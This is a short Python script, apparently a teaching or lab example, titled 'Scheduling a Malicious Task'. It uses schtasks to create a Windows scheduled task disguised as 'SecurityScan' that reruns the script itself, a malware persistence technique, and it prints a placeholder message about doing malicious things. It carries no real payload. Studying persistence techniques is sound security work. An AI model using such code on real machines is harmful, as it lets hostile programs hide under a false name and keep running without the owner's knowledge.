# Scheduling a Malicious Task

import os, random
from datetime import datetime,timedelta

# Check for an existing scheduled task
if os.system("schtasks /query /tn SecurityScan") == 0:
    os.system("schtasks /delete /f /tn SecurityScan")

print("I am doing malicious things")

filedir = os.path.join(os.getcwd(),"TaskScheduler.py")

maxInterval = 1
interval = 1+(random.random()*(maxInterval-1))
dt = datetime.now() + timedelta(minutes=interval)
# creates a string containing two strings separated by a colon. These values are calculated by extracting the hour and minute values 
# from dt and formatting them as two-digit numbers (time like 08:45)
t = "%s:%s" % (str(dt.hour).zfill(2),str(dt.minute).zfill(2))
# calcuating date same as time formatted as MM/DD/YYYY
d = "%s/%s/%s" % (str(dt.month).zfill(2),str(dt.day).zfill(2),dt.year)

# schedule the task
os.system('schtasks /create /tn SecurityScan /tr \"%s\" /sc once \
/st %s /sd %s' % (filedir,t,d))
input()
